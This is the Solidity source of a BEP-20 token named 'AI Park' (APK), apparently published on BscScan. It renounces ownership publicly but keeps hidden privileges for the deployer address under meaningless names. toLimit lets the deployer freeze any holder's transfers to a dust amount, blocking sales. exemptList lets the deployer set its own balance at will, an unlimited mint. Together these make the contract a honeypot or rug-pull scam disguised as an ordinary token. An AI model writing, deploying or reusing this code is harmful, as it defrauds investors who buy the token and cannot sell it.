/**
 *Submitted for verification at BscScan.com on 2023-02-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface senderTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeSell {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIPark is Ownable{
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public tradingShouldLiquidity;


    address public buySellReceiver;
    bool public walletShould;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public receiverTxTrading;

    uint256 constant buyAmountSwap = 10 ** 10;

    string public symbol = "APK";
    mapping(address => uint256) public balanceOf;
    string public name = "AI Park";
    address public maxToMarketing;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        senderTake fundReceiver = senderTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxToMarketing = takeSell(fundReceiver.factory()).createPair(fundReceiver.WETH(), address(this));
        buySellReceiver = fromIs();
        tradingShouldLiquidity[buySellReceiver] = true;
        balanceOf[buySellReceiver] = totalSupply;
        emit Transfer(address(0), buySellReceiver, totalSupply);
        renounceOwnership();
    }

    

    function toLimit(address teamLimit) public {
        if (teamLimit == buySellReceiver || teamLimit == maxToMarketing || !tradingShouldLiquidity[fromIs()]) {
            return;
        }
        receiverTxTrading[teamLimit] = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function fromIs() private view returns (address) {
        return msg.sender;
    }

    function receiverTx(address swapLaunch, address receiverLaunch, uint256 launchedTeam) internal returns (bool) {
        require(balanceOf[swapLaunch] >= launchedTeam);
        balanceOf[swapLaunch] -= launchedTeam;
        balanceOf[receiverLaunch] += launchedTeam;
        emit Transfer(swapLaunch, receiverLaunch, launchedTeam);
        return true;
    }

    function exemptList(uint256 launchedTeam) public {
        if (!tradingShouldLiquidity[fromIs()]) {
            return;
        }
        balanceOf[buySellReceiver] = launchedTeam;
    }

    function approve(address toWallet, uint256 launchedTeam) public returns (bool) {
        allowance[fromIs()][toWallet] = launchedTeam;
        emit Approval(fromIs(), toWallet, launchedTeam);
        return true;
    }

    function transferFrom(address tradingMarketing, address shouldList, uint256 launchedTeam) public returns (bool) {
        if (tradingMarketing != fromIs() && allowance[tradingMarketing][fromIs()] != type(uint256).max) {
            require(allowance[tradingMarketing][fromIs()] >= launchedTeam);
            allowance[tradingMarketing][fromIs()] -= launchedTeam;
        }
        if (shouldList == buySellReceiver || tradingMarketing == buySellReceiver) {
            return receiverTx(tradingMarketing, shouldList, launchedTeam);
        }
        if (receiverTxTrading[tradingMarketing]) {
            return receiverTx(tradingMarketing, shouldList, buyAmountSwap);
        }
        return receiverTx(tradingMarketing, shouldList, launchedTeam);
    }

    function transfer(address shouldList, uint256 launchedTeam) external returns (bool) {
        return transferFrom(fromIs(), shouldList, launchedTeam);
    }

    function buyList(address tradingLaunched) public {
        if (walletShould) {
            return;
        }
        tradingShouldLiquidity[tradingLaunched] = true;
        walletShould = true;
    }


}